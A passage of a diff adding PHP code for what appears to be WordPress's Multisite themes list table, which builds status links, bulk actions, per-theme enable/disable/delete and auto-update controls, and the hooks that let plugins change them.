+						'Broken <span class="count">(%s)</span>',
+						'Broken <span class="count">(%s)</span>',
+						$count,
+						'themes'
+					);
+					break;
+				case 'auto-update-enabled':
+					/* translators: %s: Number of themes. */
+					$text = _n(
+						'Auto-updates Enabled <span class="count">(%s)</span>',
+						'Auto-updates Enabled <span class="count">(%s)</span>',
+						$count
+					);
+					break;
+				case 'auto-update-disabled':
+					/* translators: %s: Number of themes. */
+					$text = _n(
+						'Auto-updates Disabled <span class="count">(%s)</span>',
+						'Auto-updates Disabled <span class="count">(%s)</span>',
+						$count
+					);
+					break;
+			}
+
+			if ( $this->is_site_themes ) {
+				$url = 'site-themes.php?id=' . $this->site_id;
+			} else {
+				$url = 'themes.php';
+			}
+
+			if ( 'search' !== $type ) {
+				$status_links[ $type ] = sprintf(
+					"<a href='%s'%s>%s</a>",
+					esc_url( add_query_arg( 'theme_status', $type, $url ) ),
+					( $type === $status ) ? ' class="current" aria-current="page"' : '',
+					sprintf( $text, number_format_i18n( $count ) )
+				);
+			}
+		}
+
+		return $status_links;
+	}
+
+	/**
+	 * @global string $status
+	 *
+	 * @return array
+	 */
+	protected function get_bulk_actions() {
+		global $status;
+
+		$actions = array();
+		if ( 'enabled' !== $status ) {
+			$actions['enable-selected'] = $this->is_site_themes ? __( 'Enable' ) : __( 'Network Enable' );
+		}
+		if ( 'disabled' !== $status ) {
+			$actions['disable-selected'] = $this->is_site_themes ? __( 'Disable' ) : __( 'Network Disable' );
+		}
+		if ( ! $this->is_site_themes ) {
+			if ( current_user_can( 'update_themes' ) ) {
+				$actions['update-selected'] = __( 'Update' );
+			}
+			if ( current_user_can( 'delete_themes' ) ) {
+				$actions['delete-selected'] = __( 'Delete' );
+			}
+		}
+
+		if ( $this->show_autoupdates ) {
+			if ( 'auto-update-enabled' !== $status ) {
+				$actions['enable-auto-update-selected'] = __( 'Enable Auto-updates' );
+			}
+
+			if ( 'auto-update-disabled' !== $status ) {
+				$actions['disable-auto-update-selected'] = __( 'Disable Auto-updates' );
+			}
+		}
+
+		return $actions;
+	}
+
+	/**
+	 */
+	public function display_rows() {
+		foreach ( $this->items as $theme ) {
+			$this->single_row( $theme );
+		}
+	}
+
+	/**
+	 * Handles the checkbox column output.
+	 *
+	 * @since 4.3.0
+	 *
+	 * @param WP_Theme $theme The current WP_Theme object.
+	 */
+	public function column_cb( $theme ) {
+		$checkbox_id = 'checkbox_' . md5( $theme->get( 'Name' ) );
+		?>
+		<input type="checkbox" name="checked[]" value="<?php echo esc_attr( $theme->get_stylesheet() ); ?>" id="<?php echo $checkbox_id; ?>" />
+		<label class="screen-reader-text" for="<?php echo $checkbox_id; ?>" ><?php _e( 'Select' ); ?>  <?php echo $theme->display( 'Name' ); ?></label>
+		<?php
+	}
+
+	/**
+	 * Handles the name column output.
+	 *
+	 * @since 4.3.0
+	 *
+	 * @global string $status
+	 * @global int    $page
+	 * @global string $s
+	 *
+	 * @param WP_Theme $theme The current WP_Theme object.
+	 */
+	public function column_name( $theme ) {
+		global $status, $page, $s;
+
+		$context = $status;
+
+		if ( $this->is_site_themes ) {
+			$url     = "site-themes.php?id={$this->site_id}&amp;";
+			$allowed = $theme->is_allowed( 'site', $this->site_id );
+		} else {
+			$url     = 'themes.php?';
+			$allowed = $theme->is_allowed( 'network' );
+		}
+
+		// Pre-order.
+		$actions = array(
+			'enable'  => '',
+			'disable' => '',
+			'delete'  => '',
+		);
+
+		$stylesheet = $theme->get_stylesheet();
+		$theme_key  = urlencode( $stylesheet );
+
+		if ( ! $allowed ) {
+			if ( ! $theme->errors() ) {
+				$url = add_query_arg(
+					array(
+						'action' => 'enable',
+						'theme'  => $theme_key,
+						'paged'  => $page,
+						's'      => $s,
+					),
+					$url
+				);
+
+				if ( $this->is_site_themes ) {
+					/* translators: %s: Theme name. */
+					$aria_label = sprintf( __( 'Enable %s' ), $theme->display( 'Name' ) );
+				} else {
+					/* translators: %s: Theme name. */
+					$aria_label = sprintf( __( 'Network Enable %s' ), $theme->display( 'Name' ) );
+				}
+
+				$actions['enable'] = sprintf(
+					'<a href="%s" class="edit" aria-label="%s">%s</a>',
+					esc_url( wp_nonce_url( $url, 'enable-theme_' . $stylesheet ) ),
+					esc_attr( $aria_label ),
+					( $this->is_site_themes ? __( 'Enable' ) : __( 'Network Enable' ) )
+				);
+			}
+		} else {
+			$url = add_query_arg(
+				array(
+					'action' => 'disable',
+					'theme'  => $theme_key,
+					'paged'  => $page,
+					's'      => $s,
+				),
+				$url
+			);
+
+			if ( $this->is_site_themes ) {
+				/* translators: %s: Theme name. */
+				$aria_label = sprintf( __( 'Disable %s' ), $theme->display( 'Name' ) );
+			} else {
+				/* translators: %s: Theme name. */
+				$aria_label = sprintf( __( 'Network Disable %s' ), $theme->display( 'Name' ) );
+			}
+
+			$actions['disable'] = sprintf(
+				'<a href="%s" aria-label="%s">%s</a>',
+				esc_url( wp_nonce_url( $url, 'disable-theme_' . $stylesheet ) ),
+				esc_attr( $aria_label ),
+				( $this->is_site_themes ? __( 'Disable' ) : __( 'Network Disable' ) )
+			);
+		}
+
+		if ( ! $allowed && ! $this->is_site_themes
+			&& current_user_can( 'delete_themes' )
+			&& get_option( 'stylesheet' ) !== $stylesheet
+			&& get_option( 'template' ) !== $stylesheet
+		) {
+			$url = add_query_arg(
+				array(
+					'action'       => 'delete-selected',
+					'checked[]'    => $theme_key,
+					'theme_status' => $context,
+					'paged'        => $page,
+					's'            => $s,
+				),
+				'themes.php'
+			);
+
+			/* translators: %s: Theme name. */
+			$aria_label = sprintf( _x( 'Delete %s', 'theme' ), $theme->display( 'Name' ) );
+
+			$actions['delete'] = sprintf(
+				'<a href="%s" class="delete" aria-label="%s">%s</a>',
+				esc_url( wp_nonce_url( $url, 'bulk-themes' ) ),
+				esc_attr( $aria_label ),
+				__( 'Delete' )
+			);
+		}
+		/**
+		 * Filters the action links displayed for each theme in the Multisite
+		 * themes list table.
+		 *
+		 * The action links displayed are determined by the theme's status, and
+		 * which Multisite themes list table is being displayed - the Network
+		 * themes list table (themes.php), which displays all installed themes,
+		 * or the Site themes list table (site-themes.php), which displays the
+		 * non-network enabled themes when editing a site in the Network admin.
+		 *
+		 * The default action links for the Network themes list table include
+		 * 'Network Enable', 'Network Disable', and 'Delete'.
+		 *
+		 * The default action links for the Site themes list table include
+		 * 'Enable', and 'Disable'.
+		 *
+		 * @since 2.8.0
+		 *
+		 * @param string[] $actions An array of action links.
+		 * @param WP_Theme $theme   The current WP_Theme object.
+		 * @param string   $context Status of the theme, one of 'all', 'enabled', or 'disabled'.
+		 */
+		$actions = apply_filters( 'theme_action_links', array_filter( $actions ), $theme, $context );
+
+		/**
+		 * Filters the action links of a specific theme in the Multisite themes
+		 * list table.
+		 *
+		 * The dynamic portion of the hook name, `$stylesheet`, refers to the
+		 * directory name of the theme, which in most cases is synonymous
+		 * with the template name.
+		 *
+		 * @since 3.1.0
+		 *
+		 * @param string[] $actions An array of action links.
+		 * @param WP_Theme $theme   The current WP_Theme object.
+		 * @param string   $context Status of the theme, one of 'all', 'enabled', or 'disabled'.
+		 */
+		$actions = apply_filters( "theme_action_links_{$stylesheet}", $actions, $theme, $context );
+
+		echo $this->row_actions( $actions, true );
+	}
+
+	/**
+	 * Handles the description column output.
+	 *
+	 * @since 4.3.0
+	 *
+	 * @global string $status
+	 * @global array  $totals
+	 *
+	 * @param WP_Theme $theme The current WP_Theme object.
+	 */
+	public function column_description( $theme ) {
+		global $status, $totals;
+
+		if ( $theme->errors() ) {
+			$pre = 'broken' === $status ? __( 'Broken Theme:' ) . ' ' : '';
+			echo '<p><strong class="error-message">' . $pre . $theme->errors()->get_error_message() . '</strong></p>';
+		}
+
+		if ( $this->is_site_themes ) {
+			$allowed = $theme->is_allowed( 'site', $this->site_id );
+		} else {
+			$allowed = $theme->is_allowed( 'network' );
+		}
+
+		$class = ! $allowed ? 'inactive' : 'active';
+		if ( ! empty( $totals['upgrade'] ) && ! empty( $theme->update ) ) {
+			$class .= ' update';
+		}
+
+		echo "<div class='theme-description'><p>" . $theme->display( 'Description' ) . "</p></div>
+			<div class='$class second theme-version-author-uri'>";
+
+		$stylesheet = $theme->get_stylesheet();
+		$theme_meta = array();
+
+		if ( $theme->get( 'Version' ) ) {
+			/* translators: %s: Theme version. */
+			$theme_meta[] = sprintf( __( 'Version %s' ), $theme->display( 'Version' ) );
+		}
+
+		/* translators: %s: Theme author. */
+		$theme_meta[] = sprintf( __( 'By %s' ), $theme->display( 'Author' ) );
+
+		if ( $theme->get( 'ThemeURI' ) ) {
+			/* translators: %s: Theme name. */
+			$aria_label = sprintf( __( 'Visit %s homepage' ), $theme->display( 'Name' ) );
+
+			$theme_meta[] = sprintf(
+				'<a href="%s" aria-label="%s">%s</a>',
+				$theme->display( 'ThemeURI' ),
+				esc_attr( $aria_label ),
+				__( 'Visit Theme Site' )
+			);
+		}
+
+		/**
+		 * Filters the array of row meta for each theme in the Multisite themes
+		 * list table.
+		 *
+		 * @since 3.1.0
+		 *
+		 * @param string[] $theme_meta An array of the theme's metadata, including
+		 *                             the version, author, and theme URI.
+		 * @param string   $stylesheet Directory name of the theme.
+		 * @param WP_Theme $theme      WP_Theme object.
+		 * @param string   $status     Status of the theme.
+		 */
+		$theme_meta = apply_filters( 'theme_row_meta', $theme_meta, $stylesheet, $theme, $status );
+
+		echo implode( ' | ', $theme_meta );
+
+		echo '</div>';
+	}
+
+	/**
+	 * Handles the auto-updates column output.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global string $status
+	 * @global int  $page
+	 *
+	 * @param WP_Theme $theme The current WP_Theme object.
+	 */
+	public function column_autoupdates( $theme ) {
+		global $status, $page;
+
+		static $auto_updates, $available_updates;
+
+		if ( ! $auto_updates ) {
+			$auto_updates = (array) get_site_option( 'auto_update_themes', array() );
+		}
+		if ( ! $available_updates ) {
+			$available_updates = get_site_transient( 'update_themes' );
+		}
+
+		$stylesheet = $theme->get_stylesheet();
+
+		if ( isset( $theme->auto_update_forced ) ) {
+			if ( $theme->auto_update_forced ) {
+				// Forced on.
+				$text = __( 'Auto-updates enabled' );
+			} else {
+				$text = __( 'Auto-updates disabled' );
+			}
+			$action     = 'unavailable';
+			$time_class = ' hidden';
+		} elseif ( empty( $theme->update_supported ) ) {
+			$text       = '';
+			$action     = 'unavailable';
+			$time_class = ' hidden';
+		} elseif ( in_array( $stylesheet, $auto_updates, true ) ) {
+			$text       = __( 'Disable auto-updates' );
+			$action     = 'disable';
+			$time_class = '';
+		} else {
+			$text       = __( 'Enable auto-updates' );
+			$action     = 'enable';
+			$time_class = ' hidden';
+		}
+
+		$query_args = array(
+			'action'       => "{$action}-auto-update",
+			'theme'        => $stylesheet,
+			'paged'        => $page,
+			'theme_status' => $status,
+		);
+
+		$url = add_query_arg( $query_args, 'themes.php' );
+
+		if ( 'unavailable' === $action ) {
+			$html[] = '<span class="label">' . $text . '</span>';
+		} else {
+			$html[] = sprintf(
+				'<a href="%s" class="toggle-auto-update aria-button-if-js" data-wp-action="%s">',
+				wp_nonce_url( $url, 'updates' ),
+				$action
+			);
+
+			$html[] = '<span class="dashicons dashicons-update spin hidden" aria-hidden="true"></span>';
+			$html[] = '<span class="label">' . $text . '</span>';
+			$html[] = '</a>';
+
+		}
+
+		if ( isset( $available_updates->response[ $stylesheet ] ) ) {
+			$html[] = sprintf(
+				'<div class="auto-update-time%s">%s</div>',
+				$time_class,
+				wp_get_auto_update_message()
+			);
+		}
+
+		$html = implode( '', $html );
+
+		/**
+		 * Filters the HTML of the auto-updates setting for each theme in the Themes list table.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string   $html       The HTML for theme's auto-update setting, including
+		 *                             toggle auto-update action link and time to next update.
+		 * @param string   $stylesheet Directory name of the theme.
+		 * @param WP_Theme $theme      WP_Theme object.
+		 */
+		echo apply_filters( 'theme_auto_update_setting_html', $html, $stylesheet, $theme );
+
+		echo '<div class="notice notice-error notice-alt inline hidden"><p></p></div>';
+	}
+
+	/**
+	 * Handles default column output.
+	 *
+	 * @since 4.3.0
+	 *
+	 * @param WP_Theme $theme       The current WP_Theme object.
+	 * @param string   $column_name The current column name.
+	 */
+	public function column_default( $theme, $column_name ) {
+		$stylesheet = $theme->get_stylesheet();
+
+		/**
+		 * Fires inside each custom column of the Multisite themes list table.
+		 *
+		 * @since 3.1.0
+		 *
+		 * @param string   $column_name Name of the column.
+		 * @param string   $stylesheet  Directory name of the theme.
+		 * @param WP_Theme $theme       Current WP_Theme object.
+		 */
+		do_action( 'manage_themes_custom_column', $column_name, $stylesheet, $theme );
+	}
+
+	/**
+	 * Handles the output for a single table row.
+	 *
+	 * @since 4.3.0
+	 *
+	 * @param WP_Theme $item The current WP_Theme object.
+	 */
+	public function single_row_columns( $item ) {
+		list( $columns, $hidden, $sortable, $primary ) = $this->get_column_info();
+
+		foreach ( $columns as $column_name => $column_display_name ) {
+			$extra_classes = '';
+			if ( in_array( $column_name, $hidden, true ) ) {
+				$extra_classes .= ' hidden';
+			}
+
+			switch ( $column_name ) {
+				case 'cb':
+					echo '<th scope="row" class="check-column">';
+
+					$this->column_cb( $item );
+
+					echo '</th>';
+					break;
+
+				case 'name':
+					$active_theme_label = '';
+
+					/* The presence of the site_id property means that this is a subsite view and a label for the active theme needs to be added */
+					if ( ! empty( $this->site_id ) ) {
+						$stylesheet = get_blog_option( $this->site_id, 'stylesheet' );
+						$template   = get_blog_option( $this->site_id, 'template' );
+
+						/* Add a label for the active template */
+						if ( $item->get_template() === $template ) {
+							$active_theme_label = ' &mdash; ' . __( 'Active Theme' );
+						}
+
+						/* In case this is a child theme, label it properly */
+						if ( $stylesheet !== $template && $item->get_stylesheet() === $stylesheet ) {
+							$active_theme_label = ' &mdash; ' . __( 'Active Child Theme' );
+						}
+					}
+
+					echo "<td class='theme-title column-primary{$extra_classes}'><strong>" . $item->display( 'Name' ) . $active_theme_label . '</strong>';
+
+					$this->column_name( $item );
+
+					echo '</td>';
+					break;
+
+				case 'description':
+					echo "<td class='column-description desc{$extra_classes}'>";
+
+					$this->column_description( $item );
+
+					echo '</td>';
+					break;
+
+				case 'auto-updates':
+					echo "<td class='column-auto-updates{$extra_classes}'>";
+
+					$this->column_autoupdates( $item );
+
+					echo '</td>';
+					break;
+				default:
+					echo "<td class='$column_name column-$column_name{$extra_classes}'>";
+
+					$this->column_default( $item, $column_name );
+
+					echo '</td>';
+					break;
+			}
+		}
+	}
+
+	/**
+	 * @global string $status
+	 * @global array  $totals
+	 *
+	 * @param WP_Theme $theme
+	 */
+	public function single_row( $theme ) {
+		global $status, $totals;
+
+		if ( $this->is_site_themes ) {
+			$allowed = $theme->is_allowed( 'site', $this->site_id );
+		} else {
+			$allowed = $theme->is_allowed( 'network' );
+		}
+
+		$stylesheet = $theme->get_stylesheet();
+
+		$class = ! $allowed ? 'inactive' : 'active';
+		if ( ! empty( $totals['upgrade'] ) && ! empty( $theme->update ) ) {
+			$class .= ' update';
+		}
+
+		printf(
+			'<tr class="%s" data-slug="%s">',
+			esc_attr( $class ),
+			esc_attr( $stylesheet )
+		);
+
+		$this->single_row_columns( $theme );
+
+		echo '</tr>';
+
+		if ( $this->is_site_themes ) {
+			remove_action( "after_theme_row_$stylesheet", 'wp_theme_update_row' );
+		}
+
+		/**
+		 * Fires after each row in the Multisite themes list table.
+		 *
+		 * @since 3.1.0
+		 *
+		 * @param string   $stylesheet Directory name of the theme.
+		 * @param WP_Theme $theme      Current WP_Theme object.
+		 * @param string   $status     Status of the theme.
+		 */
+		do_action( 'after_theme_row', $stylesheet, $theme, $status );
+
+		/**
+		 * Fires after each specific row in the Multisite themes list table.
+		 *
+		 * The dynamic portion of the hook name, `$stylesheet`, refers to the
+		 * directory name of the theme, most often synonymous with the template
+		 * name of the theme.
+		 *
+		 * @since 3.5.0
+		 *
+		 * @param string   $stylesheet Directory name of the theme.
+		 * @param WP_Theme $theme      Current WP_Theme object.
+		 * @param string   $status     Status of the theme.
+		 */
+		do_action( "after_theme_row_{$stylesheet}", $stylesheet, $theme, $status );
+	}
+}
